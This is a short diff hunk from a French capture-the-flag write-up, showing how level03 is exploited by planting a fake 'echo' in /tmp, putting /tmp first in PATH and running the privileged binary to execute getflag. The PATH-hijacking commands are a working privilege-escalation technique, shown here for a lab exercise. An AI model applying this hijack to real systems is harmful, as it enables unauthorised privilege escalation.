@@ -31,7 +31,7 @@ On voit donc que l'argument de system est `"/usr/bin/env echo Exploit me"`. Ce q
 Pour ce faire on va créer le script/exécutable, qu'on va mettre dans /tmp/echo, lui donner les bonnes permissions et un path directement sur /tmp
 
 ```
-$ echo "sh -c getflag" > /tmp/echo
+$ echo "getflag" > /tmp/echo
 $ chmod 755 /tmp/echo
 $ export PATH=/tmp:$PATH
 $ ./level03
